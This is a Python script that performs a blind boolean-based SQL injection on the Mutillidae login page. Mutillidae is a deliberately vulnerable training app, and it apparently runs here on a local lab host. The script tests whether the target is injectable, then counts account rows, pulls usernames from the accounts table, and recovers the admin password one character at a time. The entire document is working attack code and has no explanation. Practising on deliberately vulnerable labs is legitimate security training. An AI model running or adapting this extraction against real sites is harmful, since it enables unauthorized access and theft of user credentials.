#!/bin/python

import string
import requests
from ..sqli_helper import SqliHelper, MySqlConfig

# config
# request execution
def exec_request(payload: str) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' {payload}",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers, allow_redirects=False)
    result = res.status_code == 302
    print(f"[PAYLOAD] {payload} : {result}")

    return result

# basic template for extract int from MySql
template = string.Template('OR ($request)$test # ')

# Is target vulnerable ?
helper = SqliHelper(MySqlConfig(), exec_request, template)
if(helper.check("SELECT 1")):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")
    exit()

# Extract number of account
rq = "SELECT COUNT(*) FROM accounts"
helper.prepare_new([*range(0, 1500)])
result = helper.extract_val(rq)
print("Numbers of accounts : ", result)

# Extract top 10 usernames
# basic template for extract string from mysql
template = string.Template('OR ORD(MID(($request),$index,1))$test # ')
candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)
helper.prepare_new(candidates, template=template)

result = helper.extract_column(string.Template("SELECT username FROM accounts ORDER BY username LIMIT $index,1"), 0, 5)
for cell in result:
    print("Username : ", "".join(map(chr, cell)))

# extract pass
helper.prepare_new()
result = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
print("pass for 'admin' : ", "".join(map(chr, result)))
